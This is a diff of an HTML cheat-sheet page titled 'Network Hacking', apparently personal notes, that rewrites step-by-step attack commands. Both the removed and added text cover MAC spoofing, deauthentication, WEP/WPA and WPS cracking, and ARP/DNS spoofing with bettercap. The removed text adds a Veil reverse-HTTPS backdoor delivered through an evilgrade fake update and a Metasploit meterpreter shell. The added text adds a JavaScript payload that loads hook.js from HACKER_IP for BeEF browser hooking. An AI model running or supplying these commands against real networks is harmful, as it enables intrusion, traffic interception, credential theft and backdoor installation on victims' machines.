@@ -69,21 +69,27 @@
                 <ul class="current">
                     <li class="toctree-l1 current"><a class="reference internal current" href="./">Networking</a>
     <ul class="current">
-    <li class="toctree-l2"><a class="reference internal" href="#pre-connection-attack">Pre-Connection Attack</a>
+    <li class="toctree-l2"><a class="reference internal" href="#information-gathering">Information Gathering</a>
     </li>
-    <li class="toctree-l2"><a class="reference internal" href="#gaining-access">Gaining Access</a>
+    <li class="toctree-l2"><a class="reference internal" href="#exploitation-stage">Exploitation Stage</a>
         <ul>
     <li class="toctree-l3"><a class="reference internal" href="#wep-cracking">WEP Cracking</a>
     </li>
     <li class="toctree-l3"><a class="reference internal" href="#wpawpa2-cracking">WPA/WPA2 Cracking</a>
+        <ul>
+    <li class="toctree-l4"><a class="reference internal" href="#wps-enabled">WPS Enabled</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#wps-disabled">WPS Disabled</a>
     </li>
         </ul>
     </li>
-    <li class="toctree-l2"><a class="reference internal" href="#post-connection-attack">Post-Connection Attack</a>
-        <ul>
-    <li class="toctree-l3"><a class="reference internal" href="#arp-dns-spoofing">ARP &amp; DNS Spoofing</a>
+        </ul>
     </li>
-    <li class="toctree-l3"><a class="reference internal" href="#spoofing-exploit-use-case">Spoofing Exploit Use Case</a>
+    <li class="toctree-l2"><a class="reference internal" href="#post-exploitation-stage">Post-Exploitation Stage</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#mitm-basics">MITM Basics</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#mitm-code-injection">MITM &amp; Code Injection</a>
     </li>
         </ul>
     </li>
@@ -124,134 +130,93 @@
             <div class="section">
               
                 <h1 id="network-hacking">Network Hacking</h1>
-<h2 id="pre-connection-attack">Pre-Connection Attack</h2>
-<pre><code class="language-bash"># change MAC addr
-ifconfig {iface} down
-ifconfig {iface} hw ether {atk_mac_addr}
-ifconfig {iface} up
+<h2 id="information-gathering">Information Gathering</h2>
+<pre><code class="language-bash"># alter mac address
+ifconfig IFACE down
+ifconfig IFACE hw ether MAC_ADDR
+ifconfig IFACE up
 
-# set monitor mode
-iwconfig {iface}
+# set up wifi interface to sniff packets
+ifconfig IFACE down
 airmon-ng check kill
-iwconfig {iface} mode monitor
+iwconfig IFACE mode monitor
+ifconfig IFACE up
 
-# busy network -&gt; run packet sniffing
-airodump-ng {iface}
-airodump-ng --bssid {wap_mac_addr} --channel {channel} --write {output_file} {iface}
+# discover wifi boxes
+airodump-ng IFACE
 
-# iddle network -&gt; run fake authentication + packet injection
-airodump-ng --bssid {wap_mac_addr} --channel {channel} {iface}
-aireplay-ng --fakeauth 0 -a {wap_mac_addr} -h {atk_mac_addr} {iface}
-
-# deauthentication attack
-airodump-ng --bssid {wap_mac_addr} --channel {channel} {iface}
-airodump-ng --deauth {seconds} -a {wap_mac_addr} -c {target_mac_addr} {iface}
+# packet sniffing
+airodump-ng --bssid BSSID --channel CHANNEL --write sniff IFACE
 </code></pre>
-<h2 id="gaining-access">Gaining Access</h2>
+<h2 id="exploitation-stage">Exploitation Stage</h2>
 <h3 id="wep-cracking">WEP Cracking</h3>
-<pre><code class="language-bash"># cracking with packets sniffing
-aircrack-ng {output_file.cap}
-
-# cracking with ARP replay
-aireplay-ng --arpreplay -b {wap_mac_addr} -h {atk_mac_addr} {iface}
-aircrack-ng {arpreplay.cap}
+<pre><code class="language-bash"># recover bssid password from sniff capture
+aircrack-ng sniff.cap
 </code></pre>
 <h3 id="wpawpa2-cracking">WPA/WPA2 Cracking</h3>
-<pre><code class="language-bash"># identify WPS wap
-wash --interface {iface}
-reaver --bssid {wap_mac_addr} --channel {channel} --interface {iface} -vvv --no-associate
-aireplay-ng --fakeauth 30 -a {wap_mac_addr} -h {atk_mac_addr} {iface}
+<h4 id="wps-enabled">WPS Enabled</h4>
+<pre><code class="language-bash"># check for wifi boxes using WPS
+wash --interface IFACE
 
-# cracking with capturing the handshake
-aireplay-ng --deauth 4 -a {wap_mac_addr} -c {target_mac_addr} {iface}
-airodump-ng --bssid {wap_mac_addr} --channel {channel} --write {output_file} {iface}
-crunch {minx} {max} {symbols} -o {wordlist} -t {pattern}
-aircrack-ng {output_file} -w {wordlist}
+# brute force WPS
+reaver --bssid BSSID --channel CHANNEL --interface IFACE -vvv --no-associate
 
-# optimize handshake cracking with PMKs
-airolib-ng {db} --import passwd {wordlist}
-echo {wap_name} &gt; {file} &amp;&amp; airolib-ng {db} --import essid {file}
-airolib-ng {db} --batch
-aircrack-ng -r {db} {output_file_file}
-
-# optimize handshake cracking using GPU
-hashcat -I
-hashcat -m 2500 -d {gpu_device} {output_file.hccapx} {wordlist}
+# associate with the WPS bssid
+aireplay-ng --fakeauth 30 -a BSSID -h MAC_ADDR IFACE
 </code></pre>
-<h2 id="post-connection-attack">Post-Connection Attack</h2>
-<h3 id="arp-dns-spoofing">ARP &amp; DNS Spoofing</h3>
-<pre><code class="language-bash"># discover connected clients
-netdiscover -r {net/mask}
-zenmap
+<h4 id="wps-disabled">WPS Disabled</h4>
+<pre><code class="language-bash"># handshake sniffing
+airodump-ng --bssid BSSID --channel CHANNEL --write handshake IFACE
 
-# MITM / ARP spoof
+# disconnect a client from its bssid to force handshake to be resent
+aireplay-ng --deauth 5 -a BSSID -c CLIENT IFACE
+
+# crack the handshake using a wordlist
+aircrack-ng handshake.cap  -w WORDLIST
+</code></pre>
+<h2 id="post-exploitation-stage">Post-Exploitation Stage</h2>
+<h3 id="mitm-basics">MITM Basics</h3>
+<pre><code class="language-bash"># discover LAN neighbors
+netdiscover -r IP_RANGE
+
+# get more details about neighbors
+nmap ; zenmap
+
+# run a MITM attack
 echo 1 &gt; /proc/sys/net/ipv4/ip_forward
-arpspoof -i {iface} -t {target_ip} {wap_ip}
-arpspoof -i {iface} -t {wap_ip} {target_ip}
+bettercap -iface IFACE
+    &gt; caplets.show
 
-# create a bettercap caplet to automate ARP spoofing
-nano {script.cap}
-  &gt; net.probe on
-  &gt; net.recon on
-  &gt; set arp.spoof.fullduplex true
-  &gt; set arp.spoof.targets {target_ip}
-  &gt; arp.spoof on
-  &gt; set net.sniff.local true
-  &gt; net.sniff on
+    &gt; net.probe on
+    &gt; net.show
 
-# run bettercap to ARP spoof + HTTPS downgrade
-bettercap -iface {iface} -caplet {script.cap}
-  &gt; help {module}
-  &gt; caplets.show
-  &gt; hstshijack/hstshijack
+    &gt; set arp.spoof.fullduplex true
+    &gt; set arp.spoof.targets CLIENT
+    &gt; arp.spoof on
 
-# DNS spoof attack
-bettercap -iface {iface} -caplet {script.cap}
-  &gt; set dns.spoof.all true
-  &gt; set dns.spoof.domains {website, *.website}
-  &gt; dns.spoof on
+    &gt; set net.sniff.local true
+    &gt; set net.sniff.output sniff
+    &gt; net.sniff on
 
-# sniff with bettercap and analyze with wireshark
-bettercap -iface {iface} -caplet {script.cap}
-  &gt; set net.sniff.output {output_file.cap}
+    &gt; set dns.spoof.all true
+    &gt; set dns.spoof.domains example.com,*.example.com
+    &gt; dns.spoof on
 </code></pre>
-<h3 id="spoofing-exploit-use-case">Spoofing Exploit Use Case</h3>
-<pre><code class="language-bash"># create a backdoor
-cd Veil/config &amp;&amp; ./setup.sh --silent --force
-./veil.py
-  &gt; list
-  &gt; use 1
-    &gt; list
-    &gt; use 15 (reverse HTTPS)
-    &gt; set {option} {value}
-    &gt; generate
+<h3 id="mitm-code-injection">MITM &amp; Code Injection</h3>
+<pre><code class="language-js">/* first step is to create a JS script to be injected with MITM */
+var imported = document.createElement(&quot;script&quot;);
+imported.src = &quot;http://HACKER_IP:3000/hook.js&quot;
+document.head.appendChild(imported);
+</code></pre>
+<pre><code class="language-bash"># second step is to add this payload script into hstshijack caplet
+set hstshijack.payloads *:/PATH_TO_JS_SCRIPT
 
-# create a fake update in order to install the backdoor
-./evilgrade
-  &gt; show modules
-  &gt; configure {module}
-  &gt; show options
-  &gt; set {option} {value}
-  &gt; start
+# third step is to run bettercap with hstshijack caplet
+bettercap -iface IFACE
+    &gt; hstshijack/hstshijack
 
-# spoof the product owner website for the fake update
-bettercap -iface {iface} -caplet {script.cap}
-  &gt; set dns.spoof.all true
-  &gt; set dns.spoof.targets {website}
-  &gt; dns.spoof on
-
-# wait for backdoor incomming connection
-msfconsole
-  &gt; use exploit/mullti/handler
-  &gt; set PAYLOAD {reverse_https_path}
-  &gt; exploit
-
-# use meterpreter commands to hack the target
-&gt; help
-&gt; download {file}
-&gt; upload {file}
-&gt; execute -f {script}
-&gt; shell
+# fourth and last step is to run beef to hook the target browser
+beef-xss
 </code></pre>
               
             </div>
